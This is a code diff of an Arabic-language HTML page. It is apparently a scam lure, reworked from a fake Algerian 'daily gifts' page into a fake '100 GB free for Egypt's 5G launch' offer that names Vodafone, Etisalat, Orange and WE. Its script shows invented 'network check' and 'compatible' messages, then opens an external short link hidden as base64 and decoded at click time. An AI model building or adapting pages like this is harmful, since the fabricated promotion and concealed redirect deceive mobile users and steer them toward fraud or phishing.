@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>هدايا الجزائر</title>
+    <title>هدية 5G مصر</title>
     <style>
         * {
             margin: 0;
@@ -26,7 +26,7 @@
             border: 2px solid #ffd700;
             border-radius: 15px;
             padding: 25px;
-            max-width: 380px;
+            max-width: 400px;
             width: 100%;
             text-align: center;
             box-shadow: 0 10px 25px rgba(255,215,0,0.3);
@@ -37,36 +37,95 @@
             margin-bottom: 10px;
         }
 
+        .new-badge {
+            background: linear-gradient(45deg, #e74c3c, #c0392b);
+            color: white;
+            padding: 8px 15px;
+            border-radius: 20px;
+            font-size: 14px;
+            font-weight: bold;
+            margin-bottom: 15px;
+            display: inline-block;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+        }
+
         .title {
             background: #ffd700;
             color: #000;
             padding: 12px;
             border-radius: 10px;
-            font-size: 16px;
+            font-size: 18px;
             font-weight: bold;
             margin-bottom: 15px;
         }
 
-        .gift {
-            background: #000;
-            border: 2px solid #ffd700;
-            color: #ffd700;
+        .gift-5g {
+            background: linear-gradient(45deg, #3498db, #2980b9);
+            color: white;
             padding: 20px;
             border-radius: 12px;
             margin: 15px 0;
+            border: 2px solid #ffd700;
         }
 
         .gift-number {
-            font-size: 40px;
+            font-size: 42px;
             font-weight: bold;
             margin-bottom: 5px;
         }
 
         .gift-text {
             font-size: 16px;
+            margin-bottom: 5px;
         }
 
-        .offers {
+        .speed-text {
+            font-size: 14px;
+            opacity: 0.9;
+        }
+
+        .networks {
+            background: #2a2a2a;
+            border: 1px solid #ffd700;
+            padding: 15px;
+            border-radius: 10px;
+            margin: 15px 0;
+        }
+
+        .networks-title {
+            color: #ffd700;
+            font-weight: bold;
+            margin-bottom: 12px;
+            font-size: 14px;
+        }
+
+        .network-logos {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+            margin-bottom: 10px;
+        }
+
+        .network {
+            background: #fff;
+            color: #000;
+            padding: 8px;
+            border-radius: 8px;
+            font-size: 13px;
+            font-weight: bold;
+        }
+
+        .vodafone { background: #e60012; color: white; }
+        .etisalat { background: #00b140; color: white; }
+        .orange { background: #ff6600; color: white; }
+        .we { background: #662d91; color: white; }
+
+        .features {
             background: #2a2a2a;
             border: 1px solid #ffd700;
             padding: 15px;
@@ -75,7 +134,7 @@
             text-align: right;
         }
 
-        .offer {
+        .feature {
             margin: 8px 0;
             font-size: 14px;
             color: #fff;
@@ -107,59 +166,112 @@
             margin-top: 10px;
         }
 
+        .floating-5g {
+            position: absolute;
+            top: 15px;
+            right: 15px;
+            background: #3498db;
+            color: white;
+            padding: 5px 10px;
+            border-radius: 15px;
+            font-size: 12px;
+            font-weight: bold;
+        }
+
         @media (max-width: 400px) {
             .card { padding: 20px; margin: 10px; }
-            .gift-number { font-size: 30px; }
+            .gift-number { font-size: 32px; }
             .btn { font-size: 14px; padding: 12px 25px; }
+            .network-logos { grid-template-columns: 1fr; }
         }
     </style>
 </head>
 <body>
     <div class="card">
-        <div class="flag">🇩🇿</div>
+        <div class="floating-5g">5G</div>
+        
+        <div class="flag">🇪🇬</div>
+        
+        <div class="new-badge">🆕 جديد في مصر</div>
         
         <div class="title">
-            🎁 هدايا الجزائر اليومية
+            🎉 بمناسبة إطلاق شبكة 5G
         </div>
 
-        <div class="gift">
+        <div class="gift-5g">
             <div class="gift-number">100 جيجا</div>
             <div class="gift-text">هدية مجانية</div>
+            <div class="speed-text">بسرعة 5G الفائقة ⚡</div>
         </div>
 
-        <div class="offers">
-            <div class="offer">📶 100 جيجا إنترنت</div>
-            <div class="offer">📞 مكالمات مجانية</div>
-            <div class="offer">🎮 باقات الألعاب</div>
-            <div class="offer">📱 عروض خاصة</div>
+        <div class="networks">
+            <div class="networks-title">🏢 متاح لجميع الشبكات:</div>
+            <div class="network-logos">
+                <div class="network vodafone">فودافون</div>
+                <div class="network etisalat">اتصالات</div>
+                <div class="network orange">أورانج</div>
+                <div class="network we">وي</div>
+            </div>
         </div>
 
-        <button class="btn" onclick="claim()">
-            🎯 احصل على هديتك الآن
+        <div class="features">
+            <div class="feature">📶 سرعة 5G فائقة السرعة</div>
+            <div class="feature">🎮 مثالي للألعاب والفيديو</div>
+            <div class="feature">📱 لكل خط مرة واحدة</div>
+            <div class="feature">⏰ عرض لفترة محدودة</div>
+        </div>
+
+        <button class="btn" onclick="claim5G()">
+            🚀 احصل على 100 جيجا مجاناً
         </button>
 
         <div class="note">
-            إعلان ترويجي - شروط الشركة المقدمة
+            إعلان ترويجي - بمناسبة إطلاق 5G في مصر
         </div>
     </div>
 
     <script>
         const link = 'aHR0cHM6Ly9iY25zLmxpbmsvdGhQM1dv';
         
-        function claim() {
+        function claim5G() {
             const btn = document.querySelector('.btn');
-            btn.innerHTML = '⏳ جاري التحويل...';
+            btn.innerHTML = '📡 يتم فحص شبكتك...';
             btn.disabled = true;
             
             setTimeout(() => {
-                window.open(atob(link), '_blank');
-                btn.innerHTML = '✅ تم!';
+                btn.innerHTML = '✅ تم التأكد - شبكة متوافقة!';
+                
                 setTimeout(() => {
-                    btn.innerHTML = '🎯 احصل على هديتك الآن';
-                    btn.disabled = false;
+                    btn.innerHTML = '🔗 جاري التحويل لاستلام الهدية...';
+                    
+                    setTimeout(() => {
+                        window.open(atob(link), '_blank');
+                        btn.innerHTML = '🎁 تم! تحقق من النافذة الجديدة';
+                        
+                        setTimeout(() => {
+                            btn.innerHTML = '🚀 احصل على 100 جيجا مجاناً';
+                            btn.disabled = false;
+                        }, 4000);
+                    }, 1500);
                 }, 2000);
-            }, 1000);
+            }, 1500);
         }
+
+        // تأثير دخول الكارد
+        document.addEventListener('DOMContentLoaded', function() {
+            const card = document.querySelector('.card');
+            card.style.animation = 'slideIn 1s ease-out';
+        });
+
+        // إضافة CSS للأنيميشن
+        const style = document.createElement('style');
+        style.textContent = `
+            @keyframes slideIn {
+                from { opacity: 0; transform: translateY(30px) scale(0.95); }
+                to { opacity: 1; transform: translateY(0) scale(1); }
+            }
+        `;
+        document.head.appendChild(style);
     </script>
 </body>
 </html>
